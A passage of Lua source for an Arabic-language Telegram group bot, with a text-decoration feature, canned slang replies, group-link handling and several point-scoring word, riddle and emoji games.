"ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     }         
local result = {}     
i=0     
for k=1,#fonts do     
i=i+1     
local tar_font = fonts[i]:split(",")     
local text = DevProx    
local text = text:gsub("A",tar_font[1])     
local text = text:gsub("B",tar_font[2])     
local text = text:gsub("C",tar_font[3])     
local text = text:gsub("D",tar_font[4])     
local text = text:gsub("E",tar_font[5])     
local text = text:gsub("F",tar_font[6])  
local text = text:gsub("G",tar_font[7])    
local text = text:gsub("H",tar_font[8])    
local text = text:gsub("I",tar_font[9])     
local text = text:gsub("J",tar_font[10])     
local text = text:gsub("K",tar_font[11])     
local text = text:gsub("L",tar_font[12])     
local text = text:gsub("M",tar_font[13])     
local text = text:gsub("N",tar_font[14])     
local text = text:gsub("O",tar_font[15])     
local text = text:gsub("P",tar_font[16])     
local text = text:gsub("Q",tar_font[17])     
local text = text:gsub("R",tar_font[18])     
local text = text:gsub("S",tar_font[19])     
local text = text:gsub("T",tar_font[20])     
local text = text:gsub("U",tar_font[21])     
local text = text:gsub("V",tar_font[22])     
local text = text:gsub("W",tar_font[23])     
local text = text:gsub("X",tar_font[24])     
local text = text:gsub("Y",tar_font[25])     
local text = text:gsub("Z",tar_font[26])     
local text = text:gsub("a",tar_font[27])     
local text = text:gsub("b",tar_font[28])     
local text = text:gsub("c",tar_font[29])     
local text = text:gsub("d",tar_font[30])     
local text = text:gsub("e",tar_font[31])     
local text = text:gsub("f",tar_font[32])     
local text = text:gsub("g",tar_font[33])     
local text = text:gsub("h",tar_font[34])     
local text = text:gsub("i",tar_font[35])     
local text = text:gsub("j",tar_font[36])     
local text = text:gsub("k",tar_font[37])     
local text = text:gsub("l",tar_font[38])     
local text = text:gsub("m",tar_font[39])     
local text = text:gsub("n",tar_font[40])     
local text = text:gsub("o",tar_font[41])     
local text = text:gsub("p",tar_font[42])     
local text = text:gsub("q",tar_font[43])     
local text = text:gsub("r",tar_font[44])     
local text = text:gsub("s",tar_font[45])     
local text = text:gsub("t",tar_font[46])     
local text = text:gsub("u",tar_font[47])     
local text = text:gsub("v",tar_font[48])     
local text = text:gsub("w",tar_font[49])     
local text = text:gsub("x",tar_font[50])     
local text = text:gsub("y",tar_font[51])     
local text = text:gsub("z",tar_font[52])     
local text = text:gsub("0",tar_font[53])     
local text = text:gsub("9",tar_font[54])     
local text = text:gsub("8",tar_font[55])     
local text = text:gsub("7",tar_font[56])     
local text = text:gsub("6",tar_font[57])     
local text = text:gsub("5",tar_font[58])     
local text = text:gsub("4",tar_font[59])     
local text = text:gsub("3",tar_font[60])     
local text = text:gsub("2",tar_font[61])     
local text = text:gsub("1",tar_font[62])            
table.insert(result, text)     
end     
local DevProx22 = "🏆┇ الكلمه "..DevProx.." \n📤┇ تم زخرفتها {"..tostring(#fonts).."} نوع \n📥┇ اضغط على الكلمه لنسخها \n\n"
number=0     
for v=1,#result do     
number=number+1     
local DevProx = { '🔥', '🔅﴿', '❥˓ ', '💝﴿', '🐼🏆', '🙊💙', '🐥📥', '😻‘','⚡️', '⁽🌷', '🔥“', '💭', '🍿','🐼💗 ', '🐝🍷','❥̚͢₎🐣', '👄‘', ' 💭ۦ',' 🎉ۦ', ' ⚡️ۦ','℡̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ 📥🐯⇣✦', '┇♩⁽💎🌩₎⇣✿','ٰ❥ ͢ۦ‏', '⚡️ֆ₎', '🐰☄️', '⁾❥', '✿🎃❥', '✿⇣', '❥℡🦁' }     
DevProx22 = DevProx22..''..number.."  `"..result[number]..''..DevProx[math.random(#DevProx)].."`\n\n"    
end     
Dev_Abs(msg.chat_id_, 0, 1, DevProx22, 1, 'md')     
end     
end 
---------------------------------------------DevProx----------------------------------------------------------
if DevAbs:get(DevProx.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
DevAbs:del(DevProx.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local nerkh = msg.content_.text_:match("(.*)")
DevAbs:set(DevProx.."nerkh", nerkh)
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Bot *sudo* has been *Setted* ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🏆┇ تم حفظ كليشه المطور ", 1, "md")
end
end 
if text and text:match("^(.*)$") then
local DevProx = DevAbs:get('DevProx:'..bot_id..'namebot'..msg.sender_user_id_..'')
if DevProx == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حفظ الاسم ', 1, 'html')
DevAbs:set('DevProx:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
DevAbs:set('DevProx:'..bot_id..'name_bot', text)
return false 
end
end
----------------------------------------DevProx---------------------------------------------------------------
if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")

else  
--------------------------------------DevProx
if text:match("^[Ll]ink$") or text:match("^الرابط$") then
if not DevAbs:get(DevProx.."bot:tt:link:"..msg.chat_id_) then 
local link = DevAbs:get(DevProx.."bot:group:link"..msg.chat_id_)
if link then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🔗 رآبــط ٱڵمجـمۄعة    \n " .. link, 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "🔗 رآبــط ٱڵمجـمۄعة    \n " .. link, 1, "html")
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Group link is not set ! \n Plese send command Setlink and set it  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥', 1, 'md')
end
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇الرابط معطل لا يمكن ارساله', 1, 'md')
end
end
end 
if text == 'دي' or text == 'دي لك' then 
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "اخلاقك لعار"
else 
DevProx = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'سلام' or text == 'السلام عليكم' or text == 'سلام عليكم' then 
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "اطلقق سلام"
else 
DevProx = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭' or text == '😭😭😭' or text == '😭😭😭😭' then      
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "وف جععلني لدموعع"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then      
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "شبكك يكيكوت ۦ"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then      
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "اموتنن غير"
else 
DevProx = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then      
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "اطلقق ههلاو"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' then      
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "ماشيهه يعمري ونتا"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'وينك' or text == 'وينج' then 
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "موجود يمك يحلو"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'نايمين' or text == 'ميتين' then 
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "طامسينن وعيونككۦ"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'اكلك' or text == 'اكلج' then 
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "ཻاٰ̲ھہﯛ૭ ب̲ꪰـﮧدٰتـٰۧﮧ ཻالٍُـّٰ̐ہكـِّﮧْٰٖرٰཻاﯛ૭يـِٰ̲ﮧ ཻالٍُـّٰ̐ہتـٰۧﮧعـ͜ާﮧْب̲ꪰـﮧཻانٰ̲̐ـﮧْٰ̲ھہ 卍🙃♛⁽ ֆ ̯͡“"
else 
DevProx = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
if text == 'ها' or text == 'هاا' then 
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
DevProx =  "ۿۿہآ رديِٰـﮧِۢنِٰـﮧِۢۿۿہ لِٰـِﮧۢﯛ̲୭ لِٰـِﮧۢآ ₎⇣🌚🔥 ┇₎⇣"
else 
DevProx = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx, 1, 'md')
end 
if text == 'بوت' then 
name_bot = (DevAbs:get('DevProx:'..bot_id..'name_bot') or 'بروكس') 
local DevProx = {
 "اسمي "..name_bot.." 😒🔪 لتكول بوت"
}
DevProx2 = math.random(#DevProx)
Dev_Abs(msg.chat_id_, msg.id_, 1, DevProx[DevProx2] , 1, 'md') 
end
if (text and text == (DevAbs:get('DevProx:'..bot_id..'name_bot') or 'بروكس')) then
name_bot = (DevAbs:get('DevProx:'..bot_id..'name_bot') or 'عبس')
local namebot = { 
 'نعم حبي وياك '..name_bot..' كول شرايد 🌚❤️'
}
name = math.random(#namebot)
Dev_Abs(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') 
return false end
if text =='نقاطي' then 
if tonumber((DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevProx0 = '❌ ┇ ليس لديك نقاط العب اولا \n📤┇ للعب ارسل { الالعاب } '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx0, 1, 'md')
else 
DevProx = '📤┇ لديك ('..(DevAbs:get(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
end
if text ==  'حذف رسائلي' then
DevAbs:del('DevProx:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حذف رسائلك المضافه ', 1, 'md')
end
if text == 'سمايلات' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevAbs:del(DevProx..'bot:l:ids'..msg.chat_id_)
DevProx2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
DevProx = '📤┇ اول واحد يدز هذا السمايل  {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not DevAbs:get(DevProx..'bot:l:ids'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:ids'..msg.chat_id_) then 
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل سمايلات '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevProx2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
DevProx = '📤┇ اول واحد يرتبها  {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل ترتيب '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end
if text == 'محيبس' or text == 'بات' or text == 'المحيبس' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Num = math.random(1,6)
DevAbs:set(DevProx.."GAMES"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊


📤 ┇ اختر رقم يد لاستخراج المحيبس  
🎊 ┇ الفائز يحصل على { 5 } النقاط *
]]
Dev_Abs( msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbs:setex(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
if text == 'حزوره' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevProx2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
DevProx = '📤┇ اول واحد يحلها  {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk'..msg.chat_id_) or 'لفاتع')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevProx = '📤┇ انت الرابح  \n📤┇ للعب مره اخرى ارسل حزوره '
Dev_Abs(msg.chat_id_, msg.id_, 1,DevProx, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المعاني' and DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevProx2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevProx2[math.random(#DevProx2)]
DevAbs:set(DevProx..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
